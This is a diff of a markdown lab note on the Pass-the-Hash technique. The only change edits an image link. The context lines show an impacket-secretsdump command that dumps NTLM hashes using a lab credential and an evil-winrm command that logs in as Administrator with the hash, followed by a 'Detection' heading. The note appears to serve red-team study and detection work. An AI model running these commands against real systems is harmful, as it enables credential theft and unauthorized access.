@@ -7,7 +7,7 @@ Pass the Hash requires no additional lab configuration. The User's NTLM hash obt
 Get The NTLM Hash`impacket-secretsdump redteam.local/dcreplicate:"Password123"@$IP`
 ![[Dump Hash.png]]
 
-Authenticating Via NTLM Hash: `evil-winrm -i $IP -u "Administrator" -H "$HASH$"`![[WinRM auth.png]]
+Authenticating Via NTLM Hash: `evil-winrm -i $IP -u "Administrator" -H "$HASH$"`![description[WinRM auth.png]]
 
 **Detection**
 
